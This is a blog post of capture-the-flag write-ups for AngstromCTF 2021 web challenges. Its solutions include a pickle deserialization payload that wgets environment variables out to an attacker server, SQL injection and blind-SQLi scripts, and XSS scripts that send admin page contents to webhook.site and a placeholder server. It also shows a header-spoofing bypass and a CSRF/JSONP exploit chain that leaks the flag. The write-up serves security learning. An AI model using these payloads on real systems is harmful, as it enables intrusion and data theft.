<!DOCTYPE html>
<html lang="en-us">

<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="generator" content="Source Themes Academic 4.8.0">

  

  
  
  
  
  
    
    
    
  
  

  <meta name="author" content="Belkahla Ahmed">

  
  
  
    
  
  <meta name="description" content="Finally after finishing my exams , I had the opportunity to participate in the last 2 days of AngstromCTF with my team Fword and managed to solve all the web challenges except the last 3 tasks, unfortunately I didn&rsquo;t have the chance to try the last two ones , bad subjects at school are always keeping me from playing CTFs and learning useful stuffs :( !">

  
  <link rel="alternate" hreflang="en-us" href="https://ahmed-belkahla.me/post/angstromctf_web/">

  


  
  
  
  <meta name="theme-color" content="rgb(0, 136, 204)">
  

  
  

  
  
  
  
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.8.6/css/academicons.min.css" integrity="sha256-uFVgMKfistnJAfoCUQigIl+JfUaP47GrRKjf6CTPVmw=" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.0-1/css/all.min.css" integrity="sha256-4w9DunooKSr3MFXHXWyFER38WmPdm361bQS/2KUWZbU=" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">

    
    
    
      
    
    
      
      
        
          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/github.min.css" crossorigin="anonymous" title="hl-light" disabled>
          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/dracula.min.css" crossorigin="anonymous" title="hl-dark">
        
      
    

    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.css" integrity="sha256-SHMGCYmST46SoyGgo4YR/9AlK1vf3ff84Aq9yK4hdqM=" crossorigin="anonymous">
    

    

    
    
      

      
      

      
    
      

      
      

      
    
      

      
      

      
    
      

      
      

      
    
      

      
      

      
    
      

      
      

      
    
      

      
      

      
    
      

      
      

      
    
      

      
      

      
    
      

      
      

      
    
      

      
      

      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.1.2/lazysizes.min.js" integrity="sha256-Md1qLToewPeKjfAHU1zyPwOutccPAm5tahnaw7Osw0A=" crossorigin="anonymous" async></script>
      
    
      

      
      

      
    
      

      
      

      
    
      

      
      
        
      

      
    
      

      
      

      
    

  

  
  
  
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:400,700%7CRoboto:400,400italic,700%7CRoboto+Mono&display=swap">
  

  
  
  
  
  <link rel="stylesheet" href="/css/academic.css">

  




  


  

  <link rel="manifest" href="/index.webmanifest">
  <link rel="icon" type="image/png" href="/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_32x32_fill_lanczos_center_2.png">
  <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_2.png">

  <link rel="canonical" href="https://ahmed-belkahla.me/post/angstromctf_web/">

  
  
  
  
  
    
  
  
  <meta property="twitter:card" content="summary_large_image">
  
  <meta property="twitter:site" content="@BelkahlaAhmed1">
  <meta property="twitter:creator" content="@BelkahlaAhmed1">
  
  <meta property="og:site_name" content="Ahmed Belkahla">
  <meta property="og:url" content="https://ahmed-belkahla.me/post/angstromctf_web/">
  <meta property="og:title" content="AngstromCTF Web Writeups | Ahmed Belkahla">
  <meta property="og:description" content="Finally after finishing my exams , I had the opportunity to participate in the last 2 days of AngstromCTF with my team Fword and managed to solve all the web challenges except the last 3 tasks, unfortunately I didn&rsquo;t have the chance to try the last two ones , bad subjects at school are always keeping me from playing CTFs and learning useful stuffs :( !"><meta property="og:image" content="https://ahmed-belkahla.me/img/me.jpg">
  <meta property="twitter:image" content="https://ahmed-belkahla.me/img/me.jpg"><meta property="og:locale" content="en-us">
  
    
      <meta property="article:published_time" content="2021-04-11T00:20:00&#43;00:00">
    
    <meta property="article:modified_time" content="2021-04-11T00:20:00&#43;00:00">
  

  


    






  




<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://ahmed-belkahla.me/post/angstromctf_web/"
  },
  "headline": "AngstromCTF Web Writeups",
  
  "datePublished": "2021-04-11T00:20:00Z",
  "dateModified": "2021-04-11T00:20:00Z",
  
  "author": {
    "@type": "Person",
    "name": "Belkahla Ahmed"
  },
  
  "publisher": {
    "@type": "Organization",
    "name": "Ahmed Belkahla",
    "logo": {
      "@type": "ImageObject",
      "url": "https://ahmed-belkahla.me/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_2.png"
    }
  },
  "description": "Finally after finishing my exams , I had the opportunity to participate in the last 2 days of AngstromCTF with my team Fword and managed to solve all the web challenges except the last 3 tasks, unfortunately I didn\u0026rsquo;t have the chance to try the last two ones , bad subjects at school are always keeping me from playing CTFs and learning useful stuffs :( !"
}
</script>

  

  


  


  





  <title>AngstromCTF Web Writeups | Ahmed Belkahla</title>

</head>

<body id="top" data-spy="scroll" data-offset="70" data-target="#TableOfContents" class="dark">

  <aside class="search-results" id="search">
  <div class="container">
    <section class="search-header">

      <div class="row no-gutters justify-content-between mb-3">
        <div class="col-6">
          <h1>Search</h1>
        </div>
        <div class="col-6 col-search-close">
          <a class="js-search" href="#"><i class="fas fa-times-circle text-muted" aria-hidden="true"></i></a>
        </div>
      </div>

      <div id="search-box">
        
        <input name="q" id="search-query" placeholder="Search..." autocapitalize="off"
        autocomplete="off" autocorrect="off" spellcheck="false" type="search">
        
      </div>

    </section>
    <section class="section-search-results">

      <div id="search-hits">
        
      </div>

    </section>
  </div>
</aside>


  







<nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id="navbar-main">
  <div class="container">

    
    <div class="d-none d-lg-inline-flex">
      <a class="navbar-brand" href="/">Ahmed Belkahla</a>
    </div>
    

    
    <button type="button" class="navbar-toggler" data-toggle="collapse"
            data-target="#navbar-content" aria-controls="navbar" aria-expanded="false" aria-label="Toggle navigation">
    <span><i class="fas fa-bars"></i></span>
    </button>
    

    
    <div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none">
      <a class="navbar-brand" href="/">Ahmed Belkahla</a>
    </div>
    

    
    
    <div class="navbar-collapse main-menu-item collapse justify-content-start" id="navbar-content">

      
      <ul class="navbar-nav d-md-inline-flex">
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#about"><span>Home</span></a>
        </li>

        
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#posts"><span>Posts</span></a>
        </li>

        
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#projects"><span>Projects</span></a>
        </li>

        
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#contact"><span>Contact</span></a>
        </li>

        
        

        

        
        
        
          
        

        
        
        
        
        
        

        <li class="nav-item">
          <a class="nav-link " href="/files/cv.pdf"><span>CV</span></a>
        </li>

        
        

      

        
      </ul>
    </div>

    <ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2">
      
      <li class="nav-item">
        <a class="nav-link js-search" href="#"><i class="fas fa-search" aria-hidden="true"></i></a>
      </li>
      

      
      <li class="nav-item dropdown theme-dropdown">
        <a href="#" class="nav-link js-theme-selector" data-toggle="dropdown" aria-haspopup="true">
          <i class="fas fa-palette" aria-hidden="true"></i>
        </a>
        <div class="dropdown-menu">
          <a href="#" class="dropdown-item js-set-theme-light">
            <span>Light</span>
          </a>
          <a href="#" class="dropdown-item js-set-theme-dark">
            <span>Dark</span>
          </a>
          <a href="#" class="dropdown-item js-set-theme-auto">
            <span>Automatic</span>
          </a>
        </div>
      </li>
      

      

    </ul>

  </div>
</nav>


  <article class="article">

  












  

  
  
  
<div class="article-container pt-3">
  <h1>AngstromCTF Web Writeups</h1>

  

  
    


<div class="article-metadata">

  
  

  
  <span class="article-date">
    
    
      
    
    Apr 11, 2021
  </span>
  

  

  
  <span class="middot-divider"></span>
  <span class="article-reading-time">
    11 min read
  </span>
  

  
  
  

  
  

</div>

    














  
</div>



  <div class="article-container">

    <div class="article-style">
      <p>Finally after finishing my exams , I had the opportunity to participate in the last 2 days of AngstromCTF with my team Fword and managed to solve all the web challenges except the last 3 tasks, unfortunately I didn&rsquo;t have the chance to try the last two ones , bad subjects at school are always keeping me from playing CTFs and learning useful stuffs :( !
However, I have really liked the web challenges especially the client side ones, we will go through all the tasks so let&rsquo;s begin.</p>
<h2 id="jar">Jar</h2>
<p><img src="https://imgur.com/JEzoi9Q.png" alt="TASK"></p>
<p>This task was straightforward, as we can see in the source code it&rsquo;s clearly an unsafe pickle deserialization vulnerability</p>
<pre><code class="language-python">@app.route('/add', methods=['POST'])
def add():
        contents = request.cookies.get('contents')
        if contents: items = pickle.loads(base64.b64decode(contents))
        else: items = []
        items.append(request.form['item'])
        response = make_response(redirect('/'))
        response.set_cookie('contents', base64.b64encode(pickle.dumps(items)))
        return response
</code></pre>
<p>We can generate our payload with the following script to achieve RCE and exfiltrate the flag</p>
<pre><code class="language-python">import pickle,base64
class exploit(object):
        def __reduce__(self):
                import os
                return (os.system,('wget https://SERVER/?a=`env|base64|tr -d &quot;\n&quot;`',))
base64.b64encode(pickle.dumps(exploit()))

</code></pre>
<p>Then we only have to change <strong>contents</strong> cookie with our payload :D</p>
<h2 id="sea-of-quills">Sea of Quills </h2>
<p><img src="https://imgur.com/A8C9uwR.png" alt="TASK"></p>
<p>As we can see in the source code it&rsquo;s an SQL injection with some filters.</p>
<pre><code class="language-ruby">
post '/quills' do
        db = SQLite3::Database.new &quot;quills.db&quot;
        cols = params[:cols]
        lim = params[:limit]
        off = params[:offset]

        blacklist = [&quot;-&quot;, &quot;/&quot;, &quot;;&quot;, &quot;'&quot;, &quot;\&quot;&quot;]

        blacklist.each { |word|
                if cols.include? word
                        return &quot;beep boop sqli detected!&quot;
                end
        }


        if !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
                return &quot;bad, no quills for you!&quot;
        end

        @row = db.execute(&quot;select %s from quills limit %s offset %s&quot; % [cols, lim, off])

        p @row

        erb :specific
end
</code></pre>
<p>we can inject the following in cols part to get our flag (after performing the usual steps to find the column and table name)</p>
<pre><code>1,flag,2 from flagtable union select 1,2,3 
</code></pre>
<p>And Bingo we got our flag</p>
<p><img src="https://imgur.com/RQFlr3j.png" alt="FLAG"></p>
<h2 id="nomnomnom">nomnomnom</h2>
<p><img src="https://imgur.com/V2LXwDj.png" alt="TASK"></p>
<p>It was a client-side task, our goal is to leak the admin page&rsquo;s source code in order to get the flag so we have to find a way and get an XSS. Reviewing the source code we can spot a possible injection sink in the <strong>share name</strong> but unfortunately
the page is protected with a strict CSP , the only way to execute javascript (as far as I know) is using the nonce value which is randomly generated on every request.</p>
<pre><code class="language-javascript">app.get('/shares/:shareName', function(req, res) {
        // TODO: better page maybe...? would attract those sweet sweet vcbucks
        if (!(req.params.shareName in shares)) {
                return res.status(400).send('hey that share doesn\'t exist... are you a time traveller :O');
        }

        const share = shares[req.params.shareName];
        const score = share.score;
        const name = share.name;
        const nonce = crypto.randomBytes(16).toString('hex');
        let extra = '';

        if (req.cookies.no_this_is_not_the_challenge_go_away === nothisisntthechallenge) {
                extra = `deletion token: &lt;code&gt;${process.env.FLAG}&lt;/code&gt;`
        }

        return res.send(`
&lt;!DOCTYPE html&gt;
&lt;html&gt;
        &lt;head&gt;
                &lt;meta http-equiv='Content-Security-Policy' content=&quot;script-src 'nonce-${nonce}'&quot;&gt;
                &lt;title&gt;snek nomnomnom&lt;/title&gt;
        &lt;/head&gt;
        &lt;body&gt;
                ${extra}${extra ? '&lt;br /&gt;&lt;br /&gt;' : ''}
                &lt;h2&gt;snek goes &lt;em&gt;nomnomnom&lt;/em&gt;&lt;/h2&gt;&lt;br /&gt;
                Check out this score of ${score}! &lt;br /&gt;
                &lt;a href='/'&gt;Play!&lt;/a&gt; &lt;button id='reporter'&gt;Report.&lt;/button&gt; &lt;br /&gt;
                &lt;br /&gt;
                This score was set by ${name}
                &lt;script nonce='${nonce}'&gt;
function report() {
        fetch('/report/${req.params.shareName}', {
                method: 'POST'
        });
}

document.getElementById('reporter').onclick = () =&gt; { report() };
                &lt;/script&gt; 

        &lt;/body&gt;
&lt;/html&gt;`);
});

</code></pre>
<p>The first thing I tried was using markup dangling technique in order to leak the nonce and reuse it maybe but it was not possible in this case . After some tries and fails I thought that maybe if I can abuse the
already written nonce and somehow include it in a script tag I inject. Injecting the following payload in the share&rsquo;s name will lead us to use the nonce with our own src attribute</p>
<pre><code>&lt;script src=http://SERVER/app.js 
</code></pre>
<p>How it&rsquo;s interpreted:</p>
<p><img src="https://imgur.com/LOe0BL1.png" alt="TASK"></p>
<p>And we host app.js file on our server with the following content , the bot didn&rsquo;t have fetch api so I used XMLHttpRequest.</p>
<pre><code class="language-javascript">function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( &quot;GET&quot;, theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
httpGet(&quot;https://webhook.site/b494ae6c-c6f2-4ea2-b915-47e22ed4c076/?a=&quot;+btoa(document.body.innerHTML));

</code></pre>
<p>Finally you only have to report the share to the admin and get the beloved flag :D</p>
<h2 id="reactionpy">Reaction.py</h2>
<p><img src="https://imgur.com/b674MEG.png" alt="TASK"></p>
<p>We are provided with the source code of the website, it&rsquo;s a simple website with a register and login functionalities, after registering you will have a page where you can crete some predefined modules. This the most interesting function:</p>
<p><img src="https://imgur.com/QZFghFT.png" alt="TASK"></p>
<pre><code class="language-python">def add_component(name, cfg, bucket):
    if not name or not cfg:
        return (ERR, &quot;Missing parameters&quot;)
    if len(bucket) &gt;= 2:
        return (ERR, &quot;Bucket too large (our servers aren't very good :((((()&quot;)
    if len(cfg) &gt; 250:
        return (ERR, &quot;Config too large (our servers aren't very good :((((()&quot;)
    if name == &quot;welcome&quot;:
        if len(bucket) &gt; 0:
            return (ERR, &quot;Welcomes can only go at the start&quot;)
        bucket.append(
            &quot;&quot;&quot;
            &lt;form action=&quot;/newcomp&quot; method=&quot;POST&quot;&gt;
                &lt;input type=&quot;text&quot; name=&quot;name&quot; placeholder=&quot;component name&quot;&gt;
                &lt;input type=&quot;text&quot; name=&quot;cfg&quot; placeholder=&quot;component config&quot;&gt;
                &lt;input type=&quot;submit&quot; value=&quot;create component&quot;&gt;
            &lt;/form&gt;
            &lt;form action=&quot;/reset&quot; method=&quot;POST&quot;&gt;
                &lt;p&gt;warning: resetting components gets rid of this form for some reason&lt;/p&gt;
                &lt;input type=&quot;submit&quot; value=&quot;reset components&quot;&gt;
            &lt;/form&gt;
            &lt;form action=&quot;/contest&quot; method=&quot;POST&quot;&gt;
                &lt;div class=&quot;g-recaptcha&quot; data-sitekey=&quot;{}&quot;&gt;&lt;/div&gt;
                &lt;input type=&quot;submit&quot; value=&quot;submit site to contest&quot;&gt;
            &lt;/form&gt;
            &lt;p&gt;Welcome &lt;strong&gt;{}&lt;/strong&gt;!&lt;/p&gt;
            &quot;&quot;&quot;.format(
                captcha.get(&quot;sitekey&quot;), escape(cfg)
            ).strip()
        )
    elif name == &quot;char_count&quot;:
        bucket.append(
            &quot;&lt;p&gt;{}&lt;/p&gt;&quot;.format(
                escape(
                    f&quot;&lt;strong&gt;{len(cfg)}&lt;/strong&gt; characters and &lt;strong&gt;{len(cfg.split())}&lt;/strong&gt; words&quot;
                )
            )
        )
    elif name == &quot;text&quot;:
        bucket.append(&quot;&lt;p&gt;{}&lt;/p&gt;&quot;.format(escape(cfg)))
    elif name == &quot;freq&quot;:
        counts = Counter(cfg)
        (char, freq) = max(counts.items(), key=lambda x: x[1])
        bucket.append(
            &quot;&lt;p&gt;All letters: {}&lt;br&gt;Most frequent: '{}'x{}&lt;/p&gt;&quot;.format(
                &quot;&quot;.join(counts), char, freq
            )
        )
    else:
        return (ERR, &quot;Invalid component name&quot;)
    return (OK, bucket)


</code></pre>
<p>We can notice that we can only submit two modules, we have a reset feature to wipe all the created modules and all our input is well sanitized except all the letters used in <strong>freq</strong> module. Taking into consideration all the constraints
we have, we can only inject two times (because of the maximum number of modules), the non sanitized input is passed to <strong>Collectons.Counter</strong> so every duplicated character will be removed which prevent us from injecting all the payload .</p>
<p>Burp request to reset the modules:</p>
<p><img src="https://imgur.com/en49sjU.png" alt="TASK"></p>
<p>I started struggling a little bit here and tried passing the component config as an array (I noticed when testing locally that when passing an array to Collections.Counter it won&rsquo;t remove dup chars) but it didn&rsquo;t lead me anywhere.</p>
<p>After watching some anime, I took another look at the challenge and got the idea to split my payload and inject it separately in the two modules, firstly we can inject <code>&lt;script&gt;/*</code> in the <strong>freq</strong> module ( Input is not sanitized so we can safely open a script tag)
and the <code>/*</code> to comment all the garbage between the two modules and then inject our second payload <code>*/function r(u){var c=new XMLHttpRequest();c.withCredentials=true;c.open(`GET`,u,false);c.send(null);return c.responseText;}var b=r(`http://127.0.0.1:8080/?fakeuser=admin`);fetch(`https://SERVER/?a=`%2Bbtoa(b));// </code> in <strong>text</strong> module ( we have to make sure that it will not contain any characters that can be escaped ). I used the backtick instead of the quotation marks.</p>
<p>This is the final result after injecting:</p>
<p><img src="https://imgur.com/IO30QBL.png" alt="TASK"></p>
<p>Finally to report our page to the admin we had to manually add the report form and the script tag of the recaptcha. After visiting our page we receive the source code containing the flag:</p>
<p><img src="https://imgur.com/s6TCqST.png" alt="TASK"></p>
<h2 id="sea-of-quills-2">Sea of Quills 2 ##</h2>
<p><img src="https://imgur.com/RjA6RVw.png" alt="TASK"></p>
<p>This was a second version of the first SQL injection task but with more strict filters, this is the most interesting part of the source code:</p>
<pre><code class="language-ruby">
post '/quills' do
        db = SQLite3::Database.new &quot;quills.db&quot;
        cols = params[:cols]
        lim = params[:limit]
        off = params[:offset]

        blacklist = [&quot;-&quot;, &quot;/&quot;, &quot;;&quot;, &quot;'&quot;, &quot;\&quot;&quot;, &quot;flag&quot;]

        blacklist.each { |word|
                if cols.include? word
                        return &quot;beep boop sqli detected!&quot;
                end
        }

        puts &quot;select %s from quills limit %s offset %s&quot; % [cols, lim, off]
        if cols.length &gt; 24 || !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
                return &quot;bad, no quills for you!&quot;
        end

        puts &quot;select %s from quills limit %s offset %s&quot; % [cols, lim, off]
        @row = db.execute(&quot;select %s from quills limit %s offset %s&quot; % [cols, lim, off])


        p @row

        erb :specific
end

</code></pre>
<p>The most attentive readers may have noticed that cols parameter length is limited to 24 characters now and it can&rsquo;t include the word flag :( The first idea I got is to try passing an array to cols parameter in order to bypass the filters but unfortunately I couldn&rsquo;t get rid of the brackets that were causing an sqlite error. This is the resulting SQL query after passing <strong>cols</strong> as an array ( cols[]=input ):</p>
<pre><code>select [&quot;input&quot;] from quills limit 10 offset 0
</code></pre>
<p>After some fails I remembered that regex matching in ruby can be broken using \n , I was so dumb to forget something this important. I opted to the following payload in limit parameter to perform a blind SQL injection:</p>
<pre><code>10%0a%20and%20((select%20substr(flag,{count},1)%20from%20flagtable)%20%3d%3d%20&quot;{sub}&quot;%20);
</code></pre>
<p><strong>%0a</strong> to break the regex and escape it , then we will iterate over all the characters of the flag , if we have a correct letter the response will contain the values passed in cols as mentioned in the picture below :</p>
<p><img src="https://imgur.com/BDSTqTQ.png" alt="TASK"></p>
<p>This is my final exploit to exfiltrate the flag char by char:</p>
<pre><code class="language-python">
import string,requests
from urllib.parse import unquote
data={&quot;offset&quot;:&quot;7&quot;,&quot;cols&quot;:&quot;999999999,5,6&quot;}
url=&quot;https://seaofquills-two.2021.chall.actf.co/quills&quot;
chars=string.printable
flag=&quot;&quot;
i=36
print(&quot;[+] Started&quot;)
while &quot;}&quot; not in flag:
        for char in chars:
                payload='10%0a%20and%20((select%20substr(flag,{count},1)%20from%20flagtable)%20%3d%3d%20&quot;{sub}&quot;%20);'.format(count=str(i),sub=char)
                data[&quot;limit&quot;]=unquote(payload)
                r=requests.post(url,data=data)
                if &quot;999999999&quot; in r.text:
                        flag=flag+char
                        i=i+1
                        print(&quot;[+] &quot;+flag)
                        break


</code></pre>
<h2 id="spoofy">Spoofy</h2>
<p><img src="https://imgur.com/QAbO9JZ.png" alt="TASK"></p>
<p>We are given the source code as always ( Best thing about this CTF ), we have to pass the following check in order to get the flag.</p>
<pre><code class="language-python">
    if &quot;X-Forwarded-For&quot; in request.headers:
        # https://stackoverflow.com/q/18264304/
        # Some people say first ip in list, some people say last
        # I don't know who to believe
        # So just believe both
        ips: List[str] = request.headers[&quot;X-Forwarded-For&quot;].split(&quot;, &quot;)
        if not ips:
            return text_response(&quot;How is it even possible to have 0 IPs???&quot;, 400)
        if ips[0] != ips[-1]:
            return text_response(
                &quot;First and last IPs disagree so I'm just going to not serve this request.&quot;,
                400,
            )
        ip: str = ips[0]
        if ip != &quot;1.3.3.7&quot;:
            return text_response(&quot;I don't trust you &gt;:(&quot;, 401)
        return text_response(&quot;Hello 1337 haxx0r, here's the flag! &quot; + FLAG)
    else:
        return text_response(&quot;Please run the server through a proxy.&quot;, 400)
</code></pre>
<p>The application is hosted in Heroku , in fact heroku will append your real ip to the X-Forwarded-For header so it seems impossible to satisfy the mentioned conditions since our real ip is not 1.3.3.7 . The bypass is simple , we can pass
the X-Forwarded-For header twice and heroku&rsquo;s router will append our real ip to the first one then the two headers will be concatenated :D</p>
<p><img src="https://imgur.com/Hib9xam.png" alt="TASK"></p>
<h2 id="jason">Jason</h2>
<p><img src="https://imgur.com/vXCDntA.png" alt="TASK"></p>
<p>I have particularly enjoyed this challenge but I was really stupid and solved it just after the CTF ended. In fact the admin bot was using headless chrome and I was testing my exploit on firefox which had a different behaviour :( We have the source code as always , the website is simple we have a report functionality and a simple passcode keyboard.</p>
<p><img src="https://imgur.com/bNFep2h.png" alt="TASK"></p>
<pre><code class="language-javascript">const jason = require('./jason')

const express = require('express')
const bodyParser = require('body-parser')
const cookieParser = require('cookie-parser')

const app = express()

function sameOrigin (req, res, next) {
        if (req.get('referer') &amp;&amp; !req.get('referer').startsWith(process.env.URL))
                return res.sendStatus(403)
        return next()
}

app.use(bodyParser.urlencoded({ extended: false }))
app.use(cookieParser())

app.use(express.static('public'))

app.post('/passcode', function (req, res) {
        if (req.body.passcode === 'CLEAR') res.append('Set-Cookie', 'passcode=')
        else res.append('Set-Cookie', `passcode=${(req.cookies.passcode || '')+req.body.passcode}`)
        return res.redirect('/')
})

app.post('/visit', async function (req, res) {
        if (req.body.site.startsWith('http')) try {await jason.visit(req.body.site) } catch (e) {console.log(e)}
        return res.redirect('/')
})

app.get('/languages', sameOrigin, function (req, res) {
        res.jsonp({category: 'languages', items: ['C++', 'Rust', 'OCaml', 'Lisp', 'Physical touch']})
})

app.get('/friends', sameOrigin, function (req, res) {
        res.jsonp({category: 'friends', items: ['Functional programming']})
})

app.get('/flags', sameOrigin, function (req, res) {
        if (req.cookies.passcode !== process.env.PASSCODE) return res.sendStatus(403)
        res.jsonp({category: 'flags', items: [process.env.FLAG]})
})

app.listen(7331)

</code></pre>
<p>We can notice that we have to find a way to load the /flags jsonp endpoint so we have to bypass firstly the sameOrigin middleware check and find a way to send the passcode cookie in the cross origin request. The first check about sameOrigin is easy to bypass if we set
<strong>referrer-policy</strong> to <strong>no-referrer</strong>, the problem is the second part about cookies because the default behaviour of chrome is to set the SameSite attribute to lax if no SameSite attribute is specified which prevents sending cookies in cross origin requests ( More 
<a href="https://www.chromium.org/updates/same-site/faq" target="_blank" rel="noopener">Details</a> ).</p>
<p>We can notice that we have a possible injection in  Set-Cookie response header so we can inject <strong>;SameSite=None; Secure</strong> in order to permit cookies to be sent in cross site requests. There is a little piece missing which is how to send the post request in order to inject the SameSite attribute,  the idea here is to opt to <strong>Lax + POST mitigation</strong> which enables the cookie to be sent on a top-level cross-site POST request as you can see in the link provided.</p>
<p>Let&rsquo;s recapitulate , our chain will be as following:</p>
<p>First we send a post request to /passcode from a top level window in order to inject <strong>;SameSite=None; Secure</strong> then we call script tag with a src as <strong>/flags</strong> and referrer-policy set to no-referrer, This was my final exploit:</p>
<pre><code class="language-python">
from flask import Flask
import time

app = Flask(__name__)

@app.route('/delay')
def delay():
        time.sleep(9)
        return &quot;zeu&quot;

@app.route('/form')
def form():
        return &quot;&quot;&quot;
&lt;html&gt;
&lt;body&gt;
&lt;form method='post' id='hack' action='https://jason.2021.chall.actf.co/passcode'&gt;
&lt;input type='text' name='passcode' value=';SameSite=None; Secure'&gt;
&lt;/form&gt;
&lt;script&gt;
document.getElementById('hack').submit();
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
&quot;&quot;&quot;

@app.route('/flag')
def flag():
        return &quot;&quot;&quot;
&lt;html&gt;
&lt;meta name='referrer' content='no-referrer'&gt; 
&lt;body&gt;
&lt;script&gt;
function load(data){
fetch(&quot;http://SERVER?a=&quot;+data.items.map(i =&gt; i).join(''));
}
var s=document.createElement(&quot;script&quot;);
s.src=&quot;https://jason.2021.chall.actf.co/flags?callback=load&quot;;
document.body.appendChild(s);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;

&quot;&quot;&quot;

@app.route('/')
def index():
        return &quot;&quot;&quot;
&lt;html&gt;
&lt;body&gt;
&lt;img src=&quot;/delay&quot;/&gt;
&lt;script&gt;
var w=window.open(&quot;/form&quot;,&quot;win&quot;);
window.open(&quot;/flag&quot;,&quot;hah&quot;);
&lt;/script&gt;
&lt;/body&gt; 
&lt;/html&gt;
&quot;&quot;&quot;
if __name__==&quot;__main__&quot;:
        app.run(port=1234, host=&quot;0.0.0.0&quot;)


</code></pre>
<p>And bingo we get our flag :</p>
<p><img src="https://imgur.com/xnOHIJp.png" alt="TASK"></p>
<p>Unfortunately I couldn&rsquo;t try the last two challenges because of the lack of time ( school is the worst ) :'( I have really enjoyed the tasks especially the client side ones so kudos to the authors for these well designed challenges ! I hope you learned from the writeup , feel free to dm me on twitter if you have any questions!</p>

    </div>

    







<div class="share-box" aria-hidden="true">
  <ul class="share">
    
      
      
      
        
      
      
      
      <li>
        <a href="https://twitter.com/intent/tweet?url=https://ahmed-belkahla.me/post/angstromctf_web/&amp;text=AngstromCTF%20Web%20Writeups" target="_blank" rel="noopener" class="share-btn-twitter">
          <i class="fab fa-twitter"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="https://www.facebook.com/sharer.php?u=https://ahmed-belkahla.me/post/angstromctf_web/&amp;t=AngstromCTF%20Web%20Writeups" target="_blank" rel="noopener" class="share-btn-facebook">
          <i class="fab fa-facebook"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="mailto:?subject=AngstromCTF%20Web%20Writeups&amp;body=https://ahmed-belkahla.me/post/angstromctf_web/" target="_blank" rel="noopener" class="share-btn-email">
          <i class="fas fa-envelope"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="https://www.linkedin.com/shareArticle?url=https://ahmed-belkahla.me/post/angstromctf_web/&amp;title=AngstromCTF%20Web%20Writeups" target="_blank" rel="noopener" class="share-btn-linkedin">
          <i class="fab fa-linkedin-in"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="https://web.whatsapp.com/send?text=AngstromCTF%20Web%20Writeups%20https://ahmed-belkahla.me/post/angstromctf_web/" target="_blank" rel="noopener" class="share-btn-whatsapp">
          <i class="fab fa-whatsapp"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="https://service.weibo.com/share/share.php?url=https://ahmed-belkahla.me/post/angstromctf_web/&amp;title=AngstromCTF%20Web%20Writeups" target="_blank" rel="noopener" class="share-btn-weibo">
          <i class="fab fa-weibo"></i>
        </a>
      </li>
    
  </ul>
</div>












  
  





  
  
  
    
  
  
  
  <div class="media author-card content-widget-hr">
    
      
      <img class="avatar mr-3 avatar-circle" src="/authors/kahla/avatar_huac9af2fd1f181695ca5d7a1e646fb7d2_9022537_270x270_fill_lanczos_center_2.png" alt="Belkahla Ahmed">
    

    <div class="media-body">
      <h5 class="card-title"><a href="https://ahmed-belkahla.me/">Belkahla Ahmed</a></h5>
      <h6 class="card-subtitle">Cyber Security Specialist @ Yogosha - CTF Player @ Zer0pts</h6>
      <p class="card-text">Cyber Security Enthusiast from Tunisia, I enjoy playing in hacking and pentesting competitions,I skip classes to play CTF.</p>
      <ul class="network-icon" aria-hidden="true">
  
    
    
    
      
    
    
    
    
    
      
    
    <li>
      <a href="/#contact" >
        <i class="fas fa-envelope"></i>
      </a>
    </li>
  
    
    
    
      
    
    
    
    
    
      
    
    <li>
      <a href="https://twitter.com/BelkahlaAhmed1" target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
    </li>
  
    
    
    
      
    
    
    
    
    
      
    
    <li>
      <a href="https://github.com/kahla-sec" target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
    </li>
  
    
    
    
    
    
    
    
      
    
    <li>
      <a href="/files/cv.pdf" >
        <i class="ai ai-cv"></i>
      </a>
    </li>
  
</ul>

